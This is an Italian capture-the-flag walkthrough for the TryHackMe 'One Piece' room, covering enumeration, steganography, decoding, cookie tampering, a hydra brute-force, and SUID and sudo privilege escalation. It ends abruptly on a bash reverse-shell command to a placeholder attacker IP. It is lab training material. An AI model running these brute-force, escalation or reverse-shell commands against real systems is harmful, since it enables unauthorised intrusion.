# One Piece

_Difficoltà: Medium_

_____________________

# Task 1 - Set Sail

  # Deploy the machine and hoist the sail
    No Answer needed

_____________________

# Task 2 - Road Poneglyphs

-  sudo nmap -sS -sVC -Pn -p0- -A --open -T5 -vvv onepiece.thm

![1](https://github.com/Manganaccio/Manganaccio/assets/137283468/f22bc135-b3c4-4fa7-8246-a15545337781)

- la porta 21 consente di accedere tramite FTP attraverso l'username Anonymous e senza necessità di usare una password

- ftp Anonymous@onepiece.thm

![2](https://github.com/Manganaccio/Manganaccio/assets/137283468/2dd5a78f-92a9-413c-b0fa-4c3fc37f2a1b)

![3](https://github.com/Manganaccio/Manganaccio/assets/137283468/1b15d9f8-c500-4ad0-8e12-cf25170804f8)

- scarichiamo il file di testo welcome.txt ed accediamo alla directory -the_whale_tree, all'interno di quest'ultima scarichiamo i due file .road_poneglyph.jpeg e .secret_room.txt
- # welcome.txt
  _Welcome to Zou. It is an island located on the back of a massive, millennium-old elephant named Zunesha that roams the New World.
  Except this, there is not much to say about this island._

- # .secret_room.txt
  _Inuarashi: You reached the center of the Whale, the majestic tree of Zou.
  Nekomamushi: We have hidden this place for centuries.
  Inuarashi: Indeed, it holds a secret.
  Nekomamushi: Do you see this red stele ? This is a Road Poneglyph.
  Luffy: A Road Poneglyph ??
  Inuarashi: There are four Road Poneglyphs around the world. Each of them gives one of the key to reach Laugh Tale and to find the One Piece.
  Luffy: The One Piece ?? That's my dream ! I will find it and I will become the Pirate King !!!
  Nekomamushi: A lot have tried but only one succeeded over the centuries, Gol D Roger, the former Pirate King.
  Inuarashi: It is commonly known that both Emperors, Big Mom and Kaido, own a Road Poneglyph but no one knows where is the last one.
  Nekomamushi: The other issue is the power of Big Mom and Kaido, they are Emperor due to their strength, you won't be able to take them down easily.
  Luffy: I will show them, there can be only one Pirate King and it will be me !!
  Inuarashi: There is another issue regarding the Road Poneglyph.
  Nekomamushi: They are written in an ancient language and a very few people around the world can actually read them._

  # What is the name of the tree that contains the 1st Road Poneglyph?
      Answer: the whale

- l'immagine .road_poneglyph.jpeg contiene dei dati che possiamo estrarre attraverso il comando steghide extract -sf .road_poneglyph.jpeg
- i dati estratti sono una serie di caratteri che possiamo sebbene decodifichiamo non ci portano a nessun risultato dovendo trovare tutti e quattro i Poneglyph 
- visitiamo ora la pagina web essendo la porta 80 aperta
- guardando il codice sorgente si può notare un'altra frase da decodificare

![4](https://github.com/Manganaccio/Manganaccio/assets/137283468/948750ac-9db9-4765-b726-3f13c885266c)

- è necessario decodificarla prima in Base32, poi in Base64 ed infine in Base85
- _Nami ensures there are precisely 3472 possible places where she could have lost it._

(il suggerimento fornito da TryHackMe per rispondere alla domanda successiva è: Only Sea, It's Not Terrible, guardando bene le lettere maiuscole la parola è OSINT quindi sarà apportuno fare delle ricerche su google per ottenere una wordlist utile per trovare Nami)

- provvediamo ad eseguire due scansioni delle directories con gobuster, una con una wordlist già presente nel sistema (common.txt va benissimo), l'altra scansione invece con la wordlist trovata tramite OSINT (LogPose.txt)
- gobuster dir -u http://onepiece.thm/ -w /usr/share/wordlists/dirb/common.txt
  
![5](https://github.com/Manganaccio/Manganaccio/assets/137283468/ed5bb2a1-65c9-43a7-b802-50f96597f0bf)

- le directories trovate ci saranno utili più avanti
- gobuster dir -u http://onepiece.thm/ -w LogPose.txt --no-error -x html

![6](https://github.com/Manganaccio/Manganaccio/assets/137283468/9fe35ef8-a693-4f11-ae6e-1dc4929ac8a5)

- visitiamo la directory trovata, possiamo ora rispondere alla seconda domanda

  # What is the name of the 1st pirate you meet navigating the Apache Sea?
      Answer: Donquixote Doflamingo

- nella stessa pagina c'è un'immagine nera che al passaggio del mouse scopre un'altra immagine con una serie di informazioni poco chiare, visitiamo quindi il codice sorgente e troviamo l'immagine in chiaro denominata        rabbit_hole.png
- una volta aperta troviamo tre codici, il primo in esadecimale, il secondo in Base91 ed il terzo è cifrato in Vigenere
- decifrato il primo ed il secondo codice otteniamo la chiave decodificare l'ultimo... _Doflamingo is still standing_! Come suggerito dal nome dell'immagine siamo in un vicolo cieco, nessuna informazione utile!
- per procedere sarà necessario visitare la pagina _css_ trovata con la prima scansione delle directories e nel file _dressrosa_style.css_ ci viene formita una nuova directory _/king_kong_gun.jpg_
- scarichiamo l'immagine e controlliamo i metadati
- exiftool king_kong_gun.jpg

![7](https://github.com/Manganaccio/Manganaccio/assets/137283468/2d821f6f-093c-42d6-8f8f-e7afef095000)

- il risultato ci fornisce una nuova directory da visitare ed una nuova immagine da scaricare _/ko.jpg_
- analizzando le stringhe dell'immagine ci viene fornita la prossima destinazione sottoforma di una nuova directory da visitare, possiamo ora rispondere alla terza domanda
- strings ko.jpg

![8](https://github.com/Manganaccio/Manganaccio/assets/137283468/a86615fa-607b-4c48-8148-feedee4f4868)

  # What is the name of the 2nd island you reach navigating the Apache Sea?
    Answer: Whole Cake

- visitando la pagina troviamo un box dove poter digitare delle parole, ma qualsiasi carattere, parola o frase inseriamo la risposta è _I did not expect that._ 
- analizziamo quindi i cookie e vediamo che il valore fornito è _NoCakeForYou_
- possiamo cambiare questo valore con _cakesforyou_ o semplicemente _cakes_, ricaricando la pagina otteniamo così la seconda parte del Poneglyph da decodificare ed il suggerimento utile per proseguire la navigazione

 ![9](https://github.com/Manganaccio/Manganaccio/assets/137283468/b1075d00-798f-4d27-993f-d9d12ae85d2d)

 - navigando nella nuova pagina otteniamo per prima cosa la risposta alla quarta domanda

  # What is the name of the friend you meet navigating the Apache Sea?
    Answer: Buggy the Clown

- per proseguire nel viaggio Buggy ci chiederà di partecipare ad un gioco, la scelta è ricaduta su _Brain Teaser_. Attraverso questo mini gioco si può ottenere la chiave per proseguire attraverso due modi

   - 1: ispezionando la pagina e cambiando i valori della rotazione del cubo;
   - 2: sempre ispezionando la pagina e guardando il valore _id: back_ una volta esteso lo script si ottiene la directory da visitare
 
- la nuova pagina contiene diversi elementi che possono tornare utili: la risposta alla quinta domanda, le immagini, due box dove inserie username e password e la possibilità di caricare dei file

  # What is the name of the 2nd Emperor you meet navigating the Apache Sea?
      Answer: Kaido of the Beasts

- andando per esclusione se dovessimo caricare dei file, ad esempio una reverse shell, non si ottiene elemento utile in quanto non sappiamo dove e come trovare una pagina di upload

- concentriamoci quindi sull'accesso tramite username e password, la stessa pagina ci suggerisce _Speaking about brute force, Kaido is unbeatable._:

     - 1: scarichiamo l'immagine kaido-jpeg e verifichiamo se al suo interno sono presenti alcuni dati importanti. Il solo uso di steghide non ci consente di estrarre nulla in quanto dobbiamo essere in possesso di una             passphrase
     - 2: usiamo un brute force attraverso un altro tool chiamato stegseek che consente di rilevare in automatico eventuali passphrase da usare con steghide
     - 3: stegseek kaido.jpeg
     - 4: trovato l'username bisogna trovare la password, questa volta usiamo hydra con i seguenti comandi
     - 5: hydra -l K1ng_0f_th3_B3@sts -P /usr/share/wordlists/rockyou.txt onepiece.thm http-form-post "/0n1g4sh1m4.php:user=^USER^&password=^PASS^&submit_creds=Login:ERROR"

![10](https://github.com/Manganaccio/Manganaccio/assets/137283468/7be65c72-1cef-4794-b0fc-af6febad59be)
   
![11](https://github.com/Manganaccio/Manganaccio/assets/137283468/fa70a747-d1ec-43f3-b00d-25c55084c3b0)

![12](https://github.com/Manganaccio/Manganaccio/assets/137283468/7f2bdfee-24b8-49cf-a131-5d7fdfc59d70)

![13](https://github.com/Manganaccio/Manganaccio/assets/137283468/cb0cdcd0-78fb-4405-9149-94e5d79a9916)


- una volta inserite le credenziali otteniamo il codice del terzo Poneglyph ed un'informazione che all'apparenza potrebbe trarci in inganno non specificando la prossima destinazione, ma in fondo la CTF in questione        tratta di pirati quindi sono loro che vogliono ingannarci :)
- visitiamo la pagina _unspecified_ fornita dall'indizio di Kaido e troviamo così la quarta ed ultima parte del Poneglyph da decifrare
- decifriamo il lungo codice usando in ordine: Base32, codice morse, binary, hex, Base58 e Base64 ed otteniamo le credenziali di accesso che ci permettono di rispondere alla sesta domanda

  # What is the hidden message of the 4 Road Poneglyphs?   
      Answer: M0nk3y_D_7uffy:1_w1ll_b3_th3_p1r@t3_k1ng!

# Task 3 - Laugh Tale

_____________________

- riprendiamo la scansione delle porte fatta all'inizio ed accediamo tramite ssh
- fatto l'accesso leggiamo il file presente nella directory
- # laugh_tale.txt
  _Finally, we reached Laugh Tale.
All is left to do is to find the One Piece.
Wait, there is another boat in here.
Be careful, it is the boat of Marshall D Teach, one of the 4 Emperors. He is the one that led your brother Ace to his death.
You want your revenge. Let's take him down !_

  # Who is on Laugh Tale at the same time as Luffy?
      Answer: Marshall D Teach

- procediamo ad una ricerca dei file presenti nel sistema
- find / -type f -perm -4000 2>/dev/null

![14](https://github.com/Manganaccio/Manganaccio/assets/137283468/0b07ec5f-16dd-4c5d-ada6-480d8b9fc0aa)

- si può notare un file con un nome strano, esaminando con il comando _file_ si può notare che è un file eseguibile
- eseguito il file si può notare che è uno script in python, utile a questo punto per procedere alla scalata dei privilegi

 ![15](https://github.com/Manganaccio/Manganaccio/assets/137283468/ebd3f1d6-c4a7-47de-8e23-e935a77a41e7)

 - per scalare i privilegi bisogna innanzitutto progedere in senso orizzontale, infatti guardando nella directory _teach_ si può notare che nel sistema è presente un altro utente ed il comando _sudo -l_ non è consentito
 - facendo ricorso a GTFOBins nella sezione Python dobbiamo ricorrere al comando riferito a SUID
 - ./gomugomunooo_king_kobraaa -c 'import os; os.execl("/bin/sh", "sh", "-p")'

![16](https://github.com/Manganaccio/Manganaccio/assets/137283468/77516e96-0eb1-4a9a-8eb0-b083b0c73658)

- a questo punto siamo liberi di accedere ai file della directory _teach_ e leggere il contenuto del file _luffy_vs_teach.txt_ che ci consente di rispondere alla domanda e del file .password.txt che ci permette invece     di avere la shell dell'utente _7uffy_vs_T3@ch_
- # luffy_vs_teach.txt
  _This fight will determine who can take the One Piece and who will be the next Pirate King.
These 2 monsters have a matchless will and none of them can let the other prevail.
Each of them have the same dream, be the Pirate King.
For one it means: Take over the World.
For the other: Be the freest man in the World.
Each of their hit creates an earthquake felt on the entire island.
But in the end, Luffy thanks to his willpower won the fight.
Now, he needs to find the One Piece._

  # What allowed Luffy to win the fight?
      Answer: willpower

- quasi giunti al termine di questa avventura rimane da ottenere i privilegi di root
- sudo -l
 
![17](https://github.com/Manganaccio/Manganaccio/assets/137283468/19861279-c743-4ac5-871c-e5b4ef6b155e)

- riprendendo GTFOBins nella sezione _less_ cerchiamo il comando da digitare per diventare root sotto la voce SUDO
- sudo less /etc/profile

![18](https://github.com/Manganaccio/Manganaccio/assets/137283468/c1866bae-e6e6-40d5-a116-c299180950ad)

- sembra un altro vicolo cieco, per ottenere i privilegi necessari a diventare root bisogna modificare il file _less_
- lanciando il comando _cat /etc/passwd_ possiamo notare che l'utente root ha la shell di default _bin/bash_
- possiamo ora sfruttare il comando bash -i >& /dev/tcp/IP-ATT/4443 0>&1


    
  
     


      















  
